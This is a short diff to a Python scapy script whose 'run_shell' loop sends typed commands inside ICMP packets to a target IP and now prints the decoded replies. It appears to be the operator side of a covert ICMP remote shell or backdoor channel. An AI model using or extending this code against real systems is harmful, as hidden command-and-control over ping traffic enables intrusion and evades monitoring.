@@ -6,9 +6,7 @@ def run_shell(ip):
     while True:
         try:
             command = input(">> ")
-            if send_request(ip, f"run:{command}"):
-                print("Shell: the command was sent")
-            else:
+            if not send_request(ip, command):
                 print("Shell: something wrong, got no response")
         except KeyboardInterrupt:
             return
@@ -17,6 +15,8 @@ def run_shell(ip):
 
 def send_request(ip, payload):
     response = sr1(IP(dst=ip)/ICMP()/payload, timeout=1, verbose=0)
+    if response is not None:
+        print(bytes(response[ICMP].payload).decode())
     return response is not None
 
 
